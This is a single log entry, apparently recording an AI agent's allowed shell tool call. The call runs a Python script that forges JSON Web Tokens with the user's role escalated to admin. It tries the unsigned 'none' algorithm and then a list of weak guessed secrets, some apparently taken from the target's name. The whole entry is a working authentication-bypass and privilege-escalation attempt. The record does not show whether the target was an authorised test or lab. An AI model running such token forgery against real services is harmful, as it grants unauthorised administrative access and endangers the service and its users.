{"ts": 1790645738.6532528, "decision_id": "018cc43a768f", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 << 'EOF'\nimport jwt\nimport json\n\n# Original payload - escalated to admin\npayload_admin = {\n    \"user_id\": \"1c0efab7-49fd-4c70-b725-33b84d076b27\",\n    \"username\": \"user_a_001\",\n    \"role\": \"admin\",\n    \"exp\": 1790647136\n}\n\n# 1. Test \"none\" algorithm with admin role\ntoken_none_admin = jwt.encode(payload_admin, key=\"\", algorithm=\"none\")\nprint(\"=== NONE ALGORITHM (ADMIN) ===\")\nprint(token_none_admin)\nprint()\n\n# 2. Test with common weak secrets\nweak_secrets = [\"secret\", \"secretkey\", \"jwtsecret\", \"key\", \"password\", \"admin\", \"test\", \"123456\", \"changeme\", \"duck\", \"duckstore\", \"escape\"]\nprint(\"=== WEAK SECRETS (ADMIN) ===\")\nfor secret in weak_secrets:\n    try:\n        token = jwt.encode(payload_admin, key=secret, algorithm=\"HS256\")\n        print(f\"Secret '{secret}': {token}\")\n    except Exception as e:\n        print(f\"Secret '{secret}': ERROR - {e}\")\nEOF"}
